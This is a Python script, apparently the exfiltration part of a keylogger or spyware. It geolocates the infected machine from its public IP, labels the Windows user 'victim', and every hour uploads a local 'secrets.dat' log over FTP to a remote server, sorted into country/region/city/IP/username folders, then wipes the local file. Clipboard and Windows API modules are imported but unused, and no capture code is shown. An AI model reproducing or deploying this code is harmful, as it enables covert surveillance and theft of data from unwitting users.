from ftplib import FTP
import time
import win32api
import os
import requests
from lxml import html
import pyperclip


try:
    r = requests.get(r'http://jsonip.com')
    ip = r.json()['ip']
    resp = requests.get("http://whatismyipaddress.com/ip/" + ip)
    doc = html.fromstring(resp.text)
    country_xp = '//*[@id="section_left_3rd"]/table/tr[2]/td[1]/text()[1]'
    region_xp = '//*[@id="section_left_3rd"]/table/tr[3]/td[1]/text()[1]'
    city_xp = '//*[@id="section_left_3rd"]/table/tr[4]/td[1]/text()[1]'
    country = doc.xpath(country_xp)[0]
    region = doc.xpath(region_xp)[0]
    city = doc.xpath(city_xp)[0]
    victim = os.getenv('USERNAME')
except:
    sys.exit()

# --------------makes log file---------------------- #
f_name = "secrets.dat"
fo = open(f_name, 'a')
fo.close()
if country == 'Bosnia and Herzegovina ':
    country = "Bosnia and Herzegovina"

# --------------------------------------------------- #
# ---------------sending file to ftp server----------------- #
# creates folder with following subfolder structure
# country/ region/ city/ ip/ username (pc username)

def log_upload(f_name):
    t = time.localtime()
    timestamp = time.strftime('%b-%d-%Y_%H-%M-%S', t)
    filename = ("log-" + timestamp + ".dat")
    ftp = FTP("xxxxxxxxxxxxxxx") # ftp host name
    ftp.login("xxxxxxxxxx","xxxxxxxxxx") # ftp username, password
    if country in ftp.nlst():
        ftp.cwd(country)
        if region in ftp.nlst():
            ftp.cwd(region)
            if city in ftp.nlst():
                ftp.cwd(city)
                if ip in ftp.nlst():
                    ftp.cwd(ip)
                    if victim not in ftp.nlst():
                        ftp.mkd(victim)
                else:
                    ftp.mkd(ip)
                    ftp.cwd(ip)
                    ftp.mkd(victim)
            else:
                ftp.mkd(city)
                ftp.cwd(city)
                ftp.mkd(ip)
                ftp.cwd(ip)
                ftp.mkd(victim)
        else:
            ftp.mkd(region)
            ftp.cwd(region)
            ftp.mkd(city)
            ftp.cwd(city)
            ftp.mkd(ip)
            ftp.cwd(ip)
            ftp.mkd(victim)
    else:
        ftp.mkd(country)
        ftp.cwd(country)
        ftp.mkd(region)
        ftp.cwd(region)
        ftp.mkd(city)
        ftp.cwd(city)
        ftp.mkd(ip)
        ftp.cwd(ip)
        ftp.mkd(victim)

    ftp.cwd(victim)
    ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
    ftp.quit()
    
def clean_it():
    global f_name
    fo = open(f_name, 'w')
    fo.flush()
    fo.close()
    
while True:
    log_upload(f_name) # uploads file to ftp server
    clean_it() # cleans the file
    time.sleep(3600) # 1 hour sleep
